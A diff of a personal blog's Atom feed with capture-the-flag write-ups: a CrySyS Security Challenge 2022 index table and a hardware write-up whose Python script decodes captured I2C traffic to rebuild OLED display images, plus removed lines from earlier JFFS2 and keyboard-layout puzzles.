-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file finalfinalversionforrealthistime 
-finalfinalversionforrealthistime: Linux jffs2 filesystem data little endian
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Some other challenge had this jffs2 extraction &lt;a href=&quot;https://github.com/sviehb/jefferson&quot;&gt;tool&lt;/a&gt; linked to it, so I gave it a try. After extracting the FS, the first thing I saw was a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README&lt;/code&gt; file:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I hate coming up with flags, they always sound lame.
-So with this challenge I wanted to make the perfect flag.
-I may have gone a bit overboard though...
-Anyways I wrote all the flag candidates under /pi/flags/ folder in multiple
-files, so I can organize them, and select the best one.
-Sadly I now realize, that I accidentally overwrote the perfect flag,
-and I can't remember it. 
-Luckily I can remember that I wrote it in the file &quot;flag404&quot; on
-the 5. line at exactly 1612346514 unix time.
-I must have overwritten it later, because I can't find it anymore.
-Can you help me?
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Researching the newly found information, I realize you can get his file back, since the journaling mechanism implemented by JFFS2… however, this might have been a massive oversight by the creator, but if you extract the filesystem with the tool mentioned above, you get your hands on the mentioned file immediately. Then you can just read the flag:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd21{HIDDEN}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;a href=&quot;/SecChall21&quot;&gt;← Back to SecChallenge21&lt;/a&gt;&lt;/p&gt;</content><author><name>m4rcix</name></author><category term="misc" /><category term="secchallenge" /><summary type="html">Description</summary></entry><entry><title type="html">キーボード・レイアウト</title><link href="https://m4rcix.github.io/SecChall21/misc/weeb" rel="alternate" type="text/html" title="キーボード・レイアウト" /><published>2021-03-17T00:00:00+00:00</published><updated>2021-03-17T00:00:00+00:00</updated><id>https://m4rcix.github.io/SecChall21/misc/weeb</id><content type="html" xml:base="https://m4rcix.github.io/SecChall21/misc/weeb">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
-
-&lt;p&gt;You have sneaked a peek (and you happen to have photographic memory) at the phone of a colleague.&lt;/p&gt;
-
-&lt;p&gt;He is a bit of a weeb, but you know he doesn’t actually speak Japanese.&lt;/p&gt;
-
-&lt;p&gt;What could this mean on his phone?&lt;/p&gt;
-
-&lt;p&gt;author: kapi&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: kapi&lt;/li&gt;
-  &lt;li&gt;Difficulty: easy&lt;/li&gt;
-  &lt;li&gt;Attachment: &lt;a href=&quot;/media/SecChall21/Misc/Web/screenshot.jpg&quot;&gt;screenshot.jpg&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;/media/SecChall21/Misc/Weeb/screenshot.jpg&quot; alt=&quot;screenshot.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Looking at the picture, we can see the guy used Google Japanese Input to write that monstrosity out. So I guess why not, set the keyboard to the same layout on my phone, and started going ham in the Notes section of my phone. I soon realized two things:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;It was like writing sms “Back in my day”&lt;/li&gt;
-  &lt;li&gt;The picture also had an “sms-pad”&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Putting these two together, I started looking at what the output was, how it was achieved on the Japanese Input, then mirrored it to the sms-pad. One-by-one, I got the letters of the flag, which was:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd21{HIDDEN}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;a href=&quot;/SecChall21&quot;&gt;← Back to SecChallenge21&lt;/a&gt;&lt;/p&gt;</content><author><name>m4rcix</name></author><category term="misc" /><category term="secchallenge" /><summary type="html">Description</summary></entry></feed>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.1">Jekyll</generator><link href="https://m4rcix.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://m4rcix.github.io/" rel="alternate" type="text/html" /><updated>2022-03-17T16:51:04+00:00</updated><id>https://m4rcix.github.io/feed.xml</id><title type="html">m4rcix</title><subtitle>*in my best possible Obi-Wan Kenobi impression* Hello there! My name is Marci(x) and my intrests are, to name a few: cybersecurity, videogames, speedrunning. In this blog I will mostly write about my studies, CTFs I attended, challenges I solved, and probably anything else I feel like writing about. If you want, feel free to check out my socials, if you wanna contact me, feel free to do so on Discord, Twitter, etc. Happy reading! :)
+</subtitle><author><name>m4rcix</name></author><entry><title type="html">CrySyS Security Challenge 2022</title><link href="https://m4rcix.github.io/sc22" rel="alternate" type="text/html" title="CrySyS Security Challenge 2022" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/secchall22</id><content type="html" xml:base="https://m4rcix.github.io/sc22"><![CDATA[<p> </p>
+
+<p>This blogpost contains my writeups for the CrySyS Security Challenge 2022!</p>
+
+<p>Flags are <code class="language-plaintext highlighter-rouge">HIDDEN</code> until the end of the semester due to University reasons.</p>
+
+<p>The tables below contain my solution for some of the challenges. I did not managed to solve a lot, especially from the Crypto category, but since I suck at crypto, this was expected. The Solved column indicates the challenges I managed to solve during the competition.</p>
+
+<h2 id="crypto">Crypto</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">GRANNYGMA</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Encrypted Display Control</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Democracy</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">VPScoin</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">White box</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="pwn">Pwn</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/pwn/chess">che%s%s</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">heap-quest</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">pawned</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Black box</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">FORCEDFLAG</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="reverse">Reverse</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/reverse/layers">Layers</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/reverse/falleen_system">falleen system</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Advent of web3</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Exceptional</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Dimensions</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="web">Web</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/web/instant">Instant Development Company</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/web/snek">Snek</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/web/waffles">Waffles</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/web/notekeeper">Note Keeper</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">CoreQuest</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="hardware">Hardware</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/hardware/flagshift">Flagshift</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/hardware/broken">Broken</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Suspicious van</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Martian Quest: The Terraform</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Drive to checkered flag</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="misc">Misc</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/misc/office">Office Hazard</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/misc/dangerous_volcano">Dangerous Volcano</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/misc/goat">G.O.A.T. 🐐</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">refl🤣gger</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/misc/piecemaker">piecemaker</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name>m4rcix</name></author><category term="secchallenge" /><category term="crysys" /><category term="CTF" /><category term="pwn" /><category term="crypto" /><category term="web" /><category term="hardware" /><category term="misc" /><category term="reverse" /><summary type="html"><![CDATA[Yearly fun organized by CrySyS Student Core and c0r3dump!]]></summary></entry><entry><title type="html">Broken</title><link href="https://m4rcix.github.io/sc22/hardware/broken" rel="alternate" type="text/html" title="Broken" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/hardware/broken</id><content type="html" xml:base="https://m4rcix.github.io/sc22/hardware/broken"><![CDATA[<h2 id="description">Description</h2>
+
+<p>A customer just called. They dropped their Token Locker 3000, shattering both of its <code class="language-plaintext highlighter-rouge">1.3" SH1106 OLED</code> displays. I have to go take care of some business, so I’m gonna need you to recover the data for them. You’ll be able to do it, right?</p>
+
+<p>I’m not sure whether you’re familiar with the Token Locker 3000; it is a handheld crypto token protecting device. It has two screens on the two sides and two sets of keypads and buttons. When you start up the device, you have to enter two separate passwords, and if it checks out, it displays two QR codes containing the token.</p>
+
+<p>Unfortunately, we are out of replacement displays (damn supply chain shortages); thus, replacing them is not an option. However, I recorded the signals of the displays for you while the user entered their password (correctly, I hope), so you’ll have to just work out how things work. The silkscreen labels of the display’s pins are <code class="language-plaintext highlighter-rouge">GND</code>, <code class="language-plaintext highlighter-rouge">VCC</code>, <code class="language-plaintext highlighter-rouge">SDA</code>, <code class="language-plaintext highlighter-rouge">SCL</code>.</p>
+
+<p><em>Note: The SH1106 is a cheap copy of the SSD1306. Depending on the resources you manage to find, you may need to use both’s documentation, but keep in mind that they are not 100% identical.</em></p>
+
+<ul>
+  <li>Author: csf3r3ncz1</li>
+  <li>Attachments: <a href="/media/sc22/hardware/broken/challenge.sal">challenge.sal</a></li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>This challenge was seemingly comparable to last years <a href="/SecChall21/hardware/crystal">Crystal from the past</a> challenge. Should be easy. It was, but at what cost?</p>
+
+<p>I quickly found out, that the provided data capture is an <code class="language-plaintext highlighter-rouge">I2C</code> communication, transmitting the display data. Googling around I found <a href="/media/sc22/hardware/broken/SH1106.pdf">this</a> manual, which is ONLY 53 PAGES LONG.</p>
+
+<p>Understanding how the data delivered via the SDA line is interpreted by the display was quite the reading, but slowly I gathered the required knowledge to implement something that can recover me the displayed data.</p>
+
+<p>I exported the data from Salae’s Logic Analyzer to a <code class="language-plaintext highlighter-rouge">.csv</code> file, and implemented part of the protocol using python:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">csv</span>
+<span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="n">np</span>
+<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+
+<span class="c1"># saves an image of size width x height as name supplied
+#TODO: adapt code to display the matrix instead
+</span><span class="k">def</span> <span class="nf">newImg</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">width</span><span class="p">,</span> <span class="n">height</span><span class="p">,</span> <span class="n">display</span><span class="p">):</span>
+    <span class="n">nextisBlack</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="s">'RGB'</span><span class="p">,</span> <span class="p">(</span><span class="n">width</span><span class="p">,</span> <span class="n">height</span><span class="p">))</span>
+    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">height</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">width</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">display</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="n">y</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">img</span><span class="p">.</span><span class="n">putpixel</span><span class="p">((</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">),</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">255</span><span class="p">))</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">img</span><span class="p">.</span><span class="n">putpixel</span><span class="p">((</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">),</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span>
+    <span class="n">img</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">img</span>
+
+<span class="c1"># turns 0x00 to 00000000 e.g.
+</span><span class="k">def</span> <span class="nf">hex_to_bin</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
+	<span class="n">b</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
+	<span class="n">padlen</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+	<span class="k">return</span> <span class="s">"0"</span><span class="o">*</span><span class="n">padlen</span> <span class="o">+</span> <span class="n">b</span>
+
+<span class="c1"># note keeping section
+</span><span class="n">display_height</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="n">display_width</span> <span class="o">=</span> <span class="mi">128</span>
+
+<span class="n">csvdata</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="c1"># parse csv data from SalaeLogic2
+</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'signals.csv'</span><span class="p">)</span> <span class="k">as</span> <span class="n">csvfile</span><span class="p">:</span>
+	<span class="n">reader</span> <span class="o">=</span> <span class="n">csv</span><span class="p">.</span><span class="n">DictReader</span><span class="p">(</span><span class="n">csvfile</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">reader</span><span class="p">:</span>
+		<span class="n">csvdata</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">row</span><span class="p">)</span>
+
+<span class="n">display</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="n">zeros</span><span class="p">((</span><span class="n">display_width</span><span class="p">,</span> <span class="n">display_height</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
+
+<span class="n">c0</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># c0=0 last control, only data after; c0=1 following 2 is: data, cntrl
+</span><span class="n">dc</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># dc=0 the data byte is for command operation, dc=1 RAM operation
+</span>
+<span class="n">current</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># 0 if control byte, 1 if data byte is coming, we start /w control
+</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">currx</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">curry</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">freq_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">multiplex_ration_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">display_offset_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">dcdc_control_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">common_pads_config_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">contrast_control_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">dispre_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">vcom_deselect_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">dcdc_status</span> <span class="o">=</span> <span class="bp">None</span>
+
+<span class="n">column_addr_low</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">column_addr_high</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">lower_set</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">upper_set</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">page_addr</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">drawn</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">img_count</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">ram_count</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">csvdata</span><span class="p">:</span>
+	<span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="s">'type'</span><span class="p">]</span> <span class="o">==</span> <span class="s">'start'</span><span class="p">:</span>
+		<span class="c1">#print('----- START -----')
+</span>		<span class="n">c0</span> <span class="o">=</span> <span class="mi">0</span>
+		<span class="n">dc</span> <span class="o">=</span> <span class="mi">0</span>
+		<span class="n">current</span> <span class="o">=</span> <span class="mi">0</span>
+		<span class="c1">#reset everything here
+</span>		<span class="k">continue</span>
+	<span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="s">'type'</span><span class="p">]</span> <span class="o">==</span> <span class="s">'stop'</span><span class="p">:</span>
+		<span class="c1">#print('----- STOP -----')
+</span>		<span class="k">continue</span>
+	<span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="s">'type'</span><span class="p">]</span> <span class="o">==</span> <span class="s">'data'</span><span class="p">:</span>
+		<span class="n">byte</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="s">'data'</span><span class="p">]</span>
+		<span class="n">bits</span> <span class="o">=</span> <span class="n">hex_to_bin</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span>
+		<span class="n">byte</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">byte</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+		<span class="c1"># control byte is current
+</span>		<span class="k">if</span> <span class="n">current</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+			<span class="n">c0</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">bits</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+			<span class="n">dc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">bits</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+			<span class="n">current</span> <span class="o">=</span> <span class="mi">1</span>
+			<span class="k">continue</span>		
+		<span class="c1">#current byte is data byte
+</span>		<span class="k">if</span> <span class="n">current</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+			<span class="c1"># if c0 was set, next is a control byte
+</span>			<span class="k">if</span> <span class="n">c0</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+				<span class="n">current</span> <span class="o">=</span> <span class="mi">0</span>
+			<span class="c1"># data byte for command op
+</span>			<span class="k">if</span> <span class="n">dc</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+				<span class="k">if</span> <span class="n">ram_count</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Data RAM calls: </span><span class="si">{</span><span class="n">ram_count</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+					<span class="n">ram_count</span> <span class="o">=</span> <span class="mi">0</span>
+
+				<span class="k">if</span> <span class="n">freq_mode_set</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Freq: </span><span class="si">{</span><span class="n">byte</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="si">}</span><span class="s"> , Div: </span><span class="si">{</span><span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="si">}</span><span class="s"> TODO"</span><span class="p">)</span>
+					<span class="n">freq_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="k">continue</span>
+
+				<span class="c1"># 2nd byte of multiplex ration mode
+</span>				<span class="k">if</span> <span class="n">multiplex_ration_mode_set</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Multiplex ration: </span><span class="si">{</span><span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0x3f</span><span class="si">}</span><span class="s"> TODO"</span><span class="p">)</span>
+					<span class="n">multiplex_ration_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="k">continue</span>
+
+				<span class="c1"># 2nd byte of display offset mode
+</span>				<span class="k">if</span> <span class="n">display_offset_mode_set</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Display offset: </span><span class="si">{</span><span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0x3f</span><span class="si">}</span><span class="s"> TODO"</span><span class="p">)</span>
+					<span class="n">display_offset_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="k">continue</span>
+
+				<span class="c1"># dcdc control mode
+</span>				<span class="k">if</span> <span class="n">dcdc_control_mode_set</span><span class="p">:</span>
+					<span class="n">dcdc_status</span> <span class="o">=</span> <span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0x1</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'DCDC-Control Mode set: </span><span class="si">{</span><span class="n">dcdc_status</span><span class="si">}</span><span class="s"> (</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="si">}</span><span class="s">) TODO'</span><span class="p">)</span>
+					<span class="n">dcdc_control_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="k">continue</span>
+
+				<span class="c1"># common pads config control mode
+</span>				<span class="k">if</span> <span class="n">common_pads_config_mode_set</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Common Pads mode set: </span><span class="si">{</span><span class="n">bits</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="si">}</span><span class="s"> TODO'</span><span class="p">)</span>
+					<span class="n">common_pads_config_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="k">continue</span>
+
+				<span class="c1"># contrast control mode
+</span>				<span class="k">if</span> <span class="n">contrast_control_mode_set</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Contrast mode set: </span><span class="si">{</span><span class="n">byte</span><span class="si">}</span><span class="s"> TODO'</span><span class="p">)</span>
+					<span class="n">contrast_control_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="k">continue</span>
+
+				<span class="c1"># dis/precharge control mode
+</span>				<span class="k">if</span> <span class="n">dispre_mode_set</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Dis/Pre-charge mode set. Dis: </span><span class="si">{</span><span class="n">byte</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="si">}</span><span class="s">, Pre: </span><span class="si">{</span><span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="si">}</span><span class="s"> TODO'</span><span class="p">)</span>
+					<span class="n">dispre_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="k">continue</span>
+
+				<span class="c1"># dis/precharge control mode
+</span>				<span class="k">if</span> <span class="n">vcom_deselect_mode_set</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'VCOM Deselect set: </span><span class="si">{</span><span class="n">byte</span><span class="si">}</span><span class="s"> TODO'</span><span class="p">)</span>
+					<span class="n">vcom_deselect_mode_set</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="k">continue</span>
+
+				<span class="k">if</span> <span class="mh">0x00</span> <span class="o">&lt;=</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">byte</span> <span class="o">&lt;=</span> <span class="mh">0x0f</span><span class="p">:</span>
+					<span class="n">column_addr_low</span> <span class="o">=</span> <span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Setting column lower address to: </span><span class="si">{</span><span class="nb">bin</span><span class="p">(</span><span class="n">column_addr_low</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+					<span class="n">lower_set</span> <span class="o">=</span> <span class="mi">1</span>
+				<span class="k">elif</span> <span class="mh">0x10</span> <span class="o">&lt;=</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">byte</span> <span class="o">&lt;=</span> <span class="mh">0x1f</span><span class="p">:</span>
+					<span class="n">column_addr_high</span> <span class="o">=</span> <span class="n">byte</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Setting column higher address to: </span><span class="si">{</span><span class="nb">bin</span><span class="p">(</span><span class="n">column_addr_high</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+					<span class="n">upper_set</span> <span class="o">=</span> <span class="mi">1</span>
+				<span class="k">elif</span> <span class="mh">0xb0</span> <span class="o">&lt;=</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">byte</span> <span class="o">&lt;=</span> <span class="mh">0xb7</span><span class="p">:</span>
+					<span class="n">page_addr</span> <span class="o">=</span> <span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
+					<span class="n">curry</span> <span class="o">=</span> <span class="n">page_addr</span> <span class="o">*</span> <span class="mi">8</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Setting page address to: </span><span class="si">{</span><span class="n">page_addr</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+				<span class="k">elif</span> <span class="mh">0xae</span> <span class="o">&lt;=</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">byte</span> <span class="o">&lt;=</span> <span class="mh">0xaf</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"Display ON/OFF TODO"</span><span class="p">)</span>
+				<span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mh">0xd5</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Oscillator Frequency mode set TODO"</span><span class="p">)</span>
+					<span class="n">freq_mode_set</span> <span class="o">=</span> <span class="mi">1</span>
